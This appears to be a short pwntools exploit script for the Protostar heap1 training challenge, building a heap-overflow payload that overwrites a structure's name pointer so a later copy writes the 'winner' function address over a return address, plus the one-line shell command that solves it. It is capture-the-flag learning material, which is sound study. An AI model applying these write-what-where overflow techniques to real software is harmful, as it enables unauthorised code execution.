from pwn import *

context.update(arch='x86', os='linux')

i1name = 0x004052c0
i2 = 0x004052e0

diff = i2 - i1name

rbp = 0x7fffffffd8f0

# overwrite i2->name with the address we want to write to which is the location of the return address
arg1 = b"\x10"*(diff + 8) + p64(rbp)
arg2 = p64(0x401272) # winner

print(arg1, arg2)

# command that you run to solve the challenge
# ./protostar-heap1 `python -c 'import sys; sys.stdout.buffer.write(b"0"*40 + b"\x18\x40\x40" + b" " + b"0"*8 + b"\x72\x12\x40")'`

